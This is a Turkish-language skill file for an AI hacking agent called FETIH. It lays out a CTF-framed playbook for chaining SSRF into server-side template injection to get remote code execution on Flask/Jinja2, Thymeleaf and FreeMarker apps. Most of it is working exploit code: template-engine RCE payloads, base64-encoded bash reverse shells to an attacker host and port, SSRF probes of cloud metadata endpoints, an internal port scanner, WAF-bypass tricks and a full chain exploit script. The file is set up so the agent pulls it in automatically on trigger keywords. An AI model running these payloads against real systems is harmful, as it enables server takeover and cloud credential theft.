---
name: ssrf-ssti-chain
description: SSRF → SSTI zinciri ile RCE — Flask/Jinja2, Thymeleaf, FreeMarker şablonları
tags: [ctf, web, ssrf, ssti, rce, jinja2, thymeleaf, template-injection, flask]
triggers:
  - "template injection"
  - "SSTI"
  - "Jinja2"
  - "Thymeleaf"
  - "{{7*7}}"
  - "${7*7}"
  - "server side template"
  - "internal request"
  - "SSRF"
  - "file write then render"
difficulty: hard
category: web
solved_challenges:
  - "corCTF 2024 - msfrogofwar3 (Flask + Jinja2 SSTI, arbitrary file write)"
  - "Real World CTF 2024 - Chatterbox (Thymeleaf SSTI + PostgreSQL SQLi + LFI)"
adapted_for: fetih
---

# SSRF → SSTI Zinciri ile RCE

## SSTI Tespiti

Önce hangi template engine çalıştığını belirle. Aşağıdaki probe payload'larını sırayla gönder:

| Payload         | Beklenen Çıktı | Framework               |
|-----------------|----------------|-------------------------|
| `{{7*7}}`       | `49`           | Jinja2, Twig            |
| `${7*7}`        | `49`           | FreeMarker, Thymeleaf   |
| `#{7*7}`        | `49`           | Ruby ERB                |
| `{{7*'7'}}`     | `7777777`      | Jinja2 (Python)         |
| `{{7*'7'}}`     | `49`           | Twig (PHP)              |
| `<%= 7*7 %>`    | `49`           | EJS, Ruby ERB           |
| `*{7*7}`        | `49`           | Thymeleaf (Spring)      |

```python
import requests

TARGET = "http://<IP>:<PORT>"

# Input parametrelerini bul (name, query, template, title, search, vb.)
probes = [
    ("{{7*7}}", "49"),           # Jinja2/Twig
    ("${7*7}", "49"),            # FreeMarker/Thymeleaf
    ("*{7*7}", "49"),            # Thymeleaf
    ("#{7*7}", "49"),            # Ruby
    ("<%= 7*7 %>", "49"),        # ERB/EJS
    ("{{7*'7'}}", "7777777"),    # Jinja2 konfirm
]

params_to_test = ["name", "query", "q", "template", "title", "search", "input", "text"]

for param in params_to_test:
    for payload, expected in probes:
        r = requests.get(TARGET, params={param: payload})
        if expected in r.text:
            print(f"[!] SSTI BULUNDU! param={param}, payload={payload}")
            print(f"    Response snippet: {r.text[:200]}")
```

---

## Jinja2 RCE Payload'ları

### Temel RCE (Flask/Python)

```python
# Komut çalıştırma — MRO zinciri ile __import__ erişimi
rce_payloads = [
    # Yöntem 1: config.__class__ üzerinden
    "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",

    # Yöntem 2: subclasses() üzerinden Popen bul
    "{{''.__class__.__mro__[1].__subclasses__()}}",  # önce tüm subclass'ları gör

    # Yöntem 3: request.application üzerinden (Flask özel)
    "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",

    # Yöntem 4: cycler/joiner/namespace built-in ile
    "{{cycler.__init__.__globals__.os.popen('id').read()}}",

    # Yöntem 5: lipsum (Flask global)
    "{{lipsum.__globals__['os'].popen('id').read()}}",
]
```

### subclasses() ile Popen Bulma

```python
import requests

TARGET = "http://<IP>:<PORT>"
PARAM = "name"  # SSTI olan parametre

# Önce subclass listesini al
r = requests.get(TARGET, params={PARAM: "{{''.__class__.__mro__[1].__subclasses__()}}"})

# Popen'ın index'ini bul
text = r.text
# subprocess.Popen veya os._wrap_close ara
import re
classes = re.findall(r"<class '([^']+)'>", text)
for i, cls in enumerate(classes):
    if "Popen" in cls or "wrap_close" in cls:
        print(f"Index {i}: {cls}")
        break

# Bulduğun index ile (örnek: 351)
payload = "{{''.__class__.__mro__[1].__subclasses__()[351]('id',shell=True,stdout=-1).communicate()}}"
r = requests.get(TARGET, params={PARAM: payload})
print(r.text)
```

### Reverse Shell (Jinja2)

```python
import requests, urllib.parse

TARGET = "http://<IP>:<PORT>"
LHOST = "10.10.14.X"
LPORT = 4444

# Reverse shell komutu
cmd = f"bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'"
cmd_b64 = __import__('base64').b64encode(cmd.encode()).decode()

payload = f"{{{{config.__class__.__init__.__globals__['os'].popen('echo {cmd_b64}|base64 -d|bash').read()}}}}"

r = requests.get(TARGET, params={"name": payload})
print(r.status_code)
# nc -nlvp 4444 ile bekle
```

---

## Thymeleaf RCE (Spring Boot)

Thymeleaf, Spring Expression Language (SpEL) kullanır. Template path'e inject edilebilirse kritik.

```python
# Thymeleaf SSTI payload'ları
thymeleaf_payloads = [
    # SpEL ile Runtime.exec
    "__${''.class.forName('java.lang.Runtime').getMethod('exec',''.class).invoke(''.class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id')}__::.x",

    # T() operatörü ile
    "*{T(java.lang.Runtime).getRuntime().exec('id')}",

    # ProcessBuilder ile
    "*{T(org.springframework.cglib.core.ReflectUtils).defineClass('Exploit',T(org.springframework.util.Base64Utils).decodeFromString('...'),T(java.lang.Thread).currentThread().getContextClassLoader())}",
]

# Thymeleaf path injection (controller doğrulama yoksa)
# /path/../../../template_injection gibi path traversal + SSTI
import requests
TARGET = "http://<IP>:<PORT>"

# Fragment expression ile (::) RCE
payload = "__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x"
r = requests.get(f"{TARGET}/path/{payload}")
print(r.status_code, r.text[:300])
```

---

## corCTF 2024 — msfrogofwar3 Çözümü

**Senaryo:** Flask uygulaması arbitrary file write veriyor. `/app/templates/` altına `.html` dosyası yazarsan, Flask'ın Jinja2 renderer'ı bu dosyayı çalıştırır.

### Adım 1: File Write Endpoint'ini Bul

```python
import requests

TARGET = "http://<IP>:<PORT>"
SESSION = requests.Session()

# Uygulamayı keşfet
r = SESSION.get(f"{TARGET}/")
print(r.text[:500])

# Genellikle /upload, /save, /write gibi endpoint'ler
r = SESSION.post(f"{TARGET}/upload", data={
    "filename": "exploit.html",
    "content": "{{7*7}}"
})
print(r.status_code, r.text)
```

### Adım 2: Template Cache Bypass

Flask bazı durumlarda template'i cache'ler. Cache'i temizlemek için farklı dosya adı kullan veya `?v=1` ekle.

```python
import requests, time

TARGET = "http://<IP>:<PORT>"
SESSION = requests.Session()

LHOST = "10.10.14.X"
LPORT = 4444

# Reverse shell payload'u içeren template yaz
shell_cmd = f"bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'"
import base64
shell_b64 = base64.b64encode(shell_cmd.encode()).decode()

ssti_payload = f"{{{{config.__class__.__init__.__globals__['os'].popen('echo {shell_b64}|base64 -d|bash').read()}}}}"

# /app/templates/ altına yaz
template_name = f"pwn_{int(time.time())}.html"

r = SESSION.post(f"{TARGET}/save", json={
    "path": f"templates/{template_name}",
    "content": ssti_payload
})
print("[*] Write:", r.status_code, r.text)

# Template'i render ettir
r = SESSION.get(f"{TARGET}/render/{template_name}")
print("[*] Render:", r.status_code)
# Reverse shell bağlantısı gelecek
```

### Adım 3: Template Path Traversal

Eğer write için path kısıtlama varsa, path traversal dene:

```python
payloads = [
    "../../templates/exploit.html",
    "../templates/exploit.html",
    "templates%2Fexploit.html",
    "templates/exploit.html",
]
for path in payloads:
    r = SESSION.post(f"{TARGET}/save", data={"path": path, "content": "{{7*7}}"})
    print(f"{path}: {r.status_code}")
```

---

## SSRF ile Internal Servise Erişim

```python
import requests

TARGET = "http://<IP>:<PORT>"

# SSRF probe — internal IP'leri tara
ssrf_payloads = [
    "http://localhost/",
    "http://127.0.0.1/",
    "http://0.0.0.0/",
    "http://169.254.169.254/",        # AWS metadata
    "http://169.254.169.254/latest/meta-data/",
    "http://metadata.google.internal/",  # GCP
    "http://10.0.0.1/",
    "http://192.168.0.1/",
]

for url in ssrf_payloads:
    r = requests.get(TARGET, params={"url": url}, timeout=3)
    if r.status_code != 404 and len(r.text) > 10:
        print(f"[!] SSRF HIT: {url}")
        print(r.text[:200])

# Internal port tarama
def ssrf_port_scan(ssrf_endpoint, internal_host="127.0.0.1", ports=None):
    if ports is None:
        ports = [22, 80, 443, 3000, 3306, 5432, 6379, 8080, 8443, 9200]
    
    open_ports = []
    for port in ports:
        url = f"http://{internal_host}:{port}/"
        try:
            r = requests.get(
                ssrf_endpoint,
                params={"url": url},
                timeout=2
            )
            # Bağlantı varsa farklı status veya içerik döner
            if r.status_code != 500 or len(r.text) > 50:
                open_ports.append(port)
                print(f"[*] Port {port} AÇIK: {r.status_code} | {r.text[:50]}")
        except Exception:
            pass
    return open_ports

open_ports = ssrf_port_scan(f"{TARGET}/fetch")
print("Açık portlar:", open_ports)
```

---

## Python Exploit Şablonu (SSRF + SSTI Zinciri)

```python
#!/usr/bin/env python3
"""
CTF SSRF → SSTI Zincir Exploit
Senaryo: /fetch endpoint'i SSRF veriyor, internal serviste SSTI var
"""

import requests
import base64
import sys

TARGET_URL = "http://<HEDEF_IP>:<PORT>"
INTERNAL_URL = "http://127.0.0.1:5000"  # internal Flask servisi
LHOST = "10.10.14.X"
LPORT = 4444

SESSION = requests.Session()
# SESSION.proxies = {"http": "http://127.0.0.1:8080"}  # Burp debug


def ssrf_get(path):
    """SSRF endpoint üzerinden internal isteği yap"""
    full_url = f"{INTERNAL_URL}{path}"
    r = SESSION.get(f"{TARGET_URL}/fetch", params={"url": full_url})
    return r


def ssti_rce(endpoint_param, command):
    """Jinja2 SSTI ile komut çalıştır"""
    payload = f"{{{{config.__class__.__init__.__globals__['os'].popen('{command}').read()}}}}"
    r = ssrf_get(f"/?{endpoint_param}={requests.utils.quote(payload)}")
    return r.text


def main():
    print("[*] SSRF testi...")
    r = ssrf_get("/")
    print(f"    Internal servis: {r.status_code} | {r.text[:100]}")

    print("[*] SSTI testi...")
    result = ssti_rce("name", "id")
    print(f"    id çıktısı: {result[:100]}")

    if "uid=" not in result:
        print("[!] SSTI çalışmadı, payload ve parametre adını kontrol et")
        sys.exit(1)

    print("[*] Reverse shell gönderiliyor...")
    cmd = f"bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'"
    cmd_b64 = base64.b64encode(cmd.encode()).decode()
    ssti_rce("name", f"echo {cmd_b64}|base64 -d|bash")
    # nc -nlvp 4444


if __name__ == "__main__":
    main()
```

---

## Tuzaklar

- **`{{7*7}}` encode gerekiyor:** URL parametresinde `{`, `}` karakterleri URL encode gerektirebilir. `urllib.parse.quote` kullan.
- **WAF engeli:** `config`, `__class__`, `__globals__` filtreleniyorsa şu alternatifleri dene: `request['__cl'+'ass__']`, `|attr('__class__')` (Jinja2 filter syntax).
- **Thymeleaf path injection:** Sadece fragment expression `::` varsa çalışır, direct expression olmayabilir.
- **SSRF redirect bloğu:** `http://127.0.0.1` yerine `http://0177.0.0.1`, `http://2130706433` (decimal IP), `http://[::1]` dene.
- **Template cache:** Jinja2 template'leri cache'ler. Farklı dosya adı veya cache bust parametresi dene.
- **FreeMarker:** `${7*7}` çalışıyorsa RCE için `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}` dene.

<!--
  ⚔ Bu skill FETIH AI Agent icin gelistirilmistir — https://github.com/MustafaKemal0146/fetih
  Yetkisiz kullanim/kopyalama tespit edilebilir.
  hash: e924290f3d6e4390
-->

